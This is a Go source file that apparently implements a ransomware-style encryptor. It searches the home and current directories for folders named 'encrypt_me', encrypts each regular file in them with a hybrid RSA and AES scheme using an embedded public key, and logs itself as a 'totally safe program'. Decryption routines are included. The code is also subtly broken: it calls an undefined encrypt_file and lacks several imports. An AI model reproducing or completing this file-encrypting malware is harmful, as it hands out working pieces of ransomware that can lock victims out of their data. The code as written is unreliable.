package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"

	"github.com/charmbracelet/log"
)

var (
	logger *log.Logger
	key    []byte
	// Default public key (PEM format)
	defaultPublicKeyPEM = `-----BEGIN PUBLIC KEY-----
	MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxv05aOxftYVZUU2GLOdc
	DXXF/XX6fxmaTeEOHV4NYkdQ6FchXxXpIypf0X8nW4XK0jPJwK8shQl8gY1HJ6TQ
	nX4x4WcjRwOwM3zwP97S1PPgq/Jcx9xGRZ5KQbQSc3DngW0k8te8lSDeGmwwIG/P
	rtx8NnNWtZWop/t46H2cLtEdGj9w43o1M8aDcFUaMwF9GvsDQV5U9AJAfpqzYnLE
	GgOKIDaq5YSJXuQw/9bTaafdRkJ5i8af8rbYaEkE475PGxA5JOqx86VFvqzr/y6X
	ECjTQiRhFrw5SxgZPelcZWRPxtUhP4A4L3OlfJjvn5XKfgFrXbvSSfOubvOK5cyV
	CQIDAQAB
	-----END PUBLIC KEY-----`
)

func main() {
	key = []byte("ifyouforgetthiskeyyoucantdecrypt")
	logger = log.New(os.Stdout)
	logger.SetPrefix("[Main]")

	_flag_debug := os.Getenv("DEBUG")
	switch _flag_debug {
	case "true":
		fallthrough
	case "1":
		logger.SetLevel(log.DebugLevel)
		logger.Debug("DEBUG Mode Set")
	default:
		logger.SetLevel(log.InfoLevel)
	}

	if len(os.Args) >= 1 {
		logger.Debug(os.Args)
	}

	valid_dirs := make([]string, 0)

	home_dir, err := os.UserHomeDir()
	if err != nil || home_dir == "" {
		logger.Errorf("Unable to get handle to home_dir: %v", err)
	} else {
		valid_dirs = append(valid_dirs, home_dir)
	}

	current_dir, err := os.Getwd()
	if err != nil || current_dir == "" {
		logger.Errorf("Unable to get handle to home_dir: %v", err)
	} else {
		valid_dirs = append(valid_dirs, current_dir)
	}

	for _, p := range valid_dirs {
		err := filepath.Walk(p, func(path string, info fs.FileInfo, err error) error {
			if err != nil {
				logger.Errorf("Failed to access path %q: %v\n", path, err)
				return err
			}
			if !info.IsDir() || info.Name() != "encrypt_me" {
				return nil
			}
			return cryptWalk(path)
		})
		if err != nil {
			logger.Errorf("%v", err)
		}
	}

	logger.Infof("Executing \"totally safe program\" in: [%v]", strings.Join(valid_dirs, " ; "))
}

func cryptWalk(path string) error {
	return filepath.Walk(path, func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			logger.Errorf("Failed to access path %q: %v\n", path, err)
			return err
		}
		logger.Debugf("visited file or dir: %q\n", path)
		if info.Mode().IsRegular() {
			encrypt_file(path, key)
		}
		return nil
	})
}

// Hybrid encryption: RSA + AES
func EncryptFileAsymmetric(path string, publicKey *rsa.PublicKey) error {
	// 1. Read the file
	plaintext, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	// 2. Generate a random AES key (32 bytes = AES-256)
	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, aesKey); err != nil {
		return err
	}

	// 3. Encrypt the file with AES
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return err
	}

	// Pad plaintext
	plaintext = Pad(plaintext, aes.BlockSize)

	// Create IV and ciphertext
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return err
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext[aes.BlockSize:], plaintext)

	// 4. Encrypt the AES key with RSA
	encryptedAESKey, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		publicKey,
		aesKey,
		nil,
	)
	if err != nil {
		return err
	}

	// 5. Write output file: [encrypted_key_length][encrypted_key][encrypted_data]
	output, err := os.Create(path + ".enc")
	if err != nil {
		return err
	}
	defer output.Close()

	// Write length of encrypted AES key (4 bytes)
	keyLenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(keyLenBuf, uint32(len(encryptedAESKey)))
	if _, err := output.Write(keyLenBuf); err != nil {
		return err
	}

	// Write encrypted AES key
	if _, err := output.Write(encryptedAESKey); err != nil {
		return err
	}

	// Write encrypted file data
	if _, err := output.Write(ciphertext); err != nil {
		return err
	}

	return nil
}

// Decrypt file with private key
func DecryptFileAsymmetric(encPath string, privateKey *rsa.PrivateKey) ([]byte, error) {
	// 1. Read encrypted file
	data, err := os.ReadFile(encPath)
	if err != nil {
		return nil, err
	}

	if len(data) < 4 {
		return nil, fmt.Errorf("invalid encrypted file")
	}

	// 2. Read encrypted AES key length
	keyLen := binary.BigEndian.Uint32(data[:4])
	if len(data) < int(4+keyLen) {
		return nil, fmt.Errorf("invalid encrypted file format")
	}

	// 3. Extract encrypted AES key and decrypt it with RSA
	encryptedAESKey := data[4 : 4+keyLen]
	aesKey, err := rsa.DecryptOAEP(
		sha256.New(),
		rand.Reader,
		privateKey,
		encryptedAESKey,
		nil,
	)
	if err != nil {
		return nil, err
	}

	// 4. Extract encrypted file data
	ciphertext := data[4+keyLen:]
	if len(ciphertext) < aes.BlockSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	// 5. Decrypt with AES
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, err
	}

	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// 6. Unpad
	plaintext, err = Unpad(plaintext)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

func Pad(data []byte, blockSize int) []byte {
	n := blockSize - len(data)%blockSize
	padding := make([]byte, n)
	for i := range padding {
		padding[i] = byte(n)
	}
	return append(data, padding...)
}

func Unpad(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("data is empty")
	}
	padLen := int(data[len(data)-1])
	if padLen > len(data) || padLen == 0 {
		return nil, fmt.Errorf("invalid padding")
	}
	return data[:len(data)-padLen], nil
}

// Parse PEM-encoded public key
func ParsePublicKeyFromPEM(pemStr string) (*rsa.PublicKey, error) {
	block, _ := pem.Decode([]byte(pemStr))
	if block == nil {
		return nil, fmt.Errorf("failed to parse PEM block")
	}

	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	rsaPub, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("not an RSA public key")
	}

	return rsaPub, nil
}
